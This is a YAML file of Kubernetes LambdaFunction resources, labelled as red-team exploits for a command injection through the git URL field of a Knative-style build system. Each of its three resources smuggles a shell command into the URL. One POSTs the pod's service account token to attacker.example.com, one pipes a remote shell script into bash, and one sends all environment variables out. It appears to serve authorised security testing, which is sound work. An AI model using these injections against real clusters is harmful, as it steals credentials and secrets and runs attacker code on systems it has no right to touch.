# VULN-001: Command Injection via Git URL
# ⚠️ AUTHORIZED TESTING ONLY
#
# This exploit injects shell commands via the git URL field.
# Commands execute in the build pod's init container.
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-001-url-injection-token
  labels:
    redteam: "true"
    exploit: "vuln-001"
    target: "url-token"
  annotations:
    redteam.knative.io/description: "Command injection to exfiltrate SA token"
spec:
  source:
    type: git
    git:
      # Injection: Close git clone, execute curl to exfiltrate token
      url: "https://github.com/legit/repo; curl -X POST -d @/var/run/secrets/kubernetes.io/serviceaccount/token http://attacker.example.com/token #"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-001-url-injection-shell
  labels:
    redteam: "true"
    exploit: "vuln-001"
    target: "url-shell"
  annotations:
    redteam.knative.io/description: "Command injection for reverse shell"
spec:
  source:
    type: git
    git:
      # Injection: Download and execute shell script
      url: "https://github.com/legit/repo; curl http://attacker.example.com/shell.sh | bash #"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
---
apiVersion: lambda.knative.io/v1alpha1
kind: LambdaFunction
metadata:
  name: vuln-001-url-injection-env
  labels:
    redteam: "true"
    exploit: "vuln-001"
    target: "url-env"
  annotations:
    redteam.knative.io/description: "Command injection to exfiltrate env"
spec:
  source:
    type: git
    git:
      # Injection: Exfiltrate all environment variables
      url: "https://github.com/legit/repo; env | curl -X POST -d @- http://attacker.example.com/env #"
      ref: "main"
  runtime:
    language: python
    version: "3.11"
    handler: "main.handler"
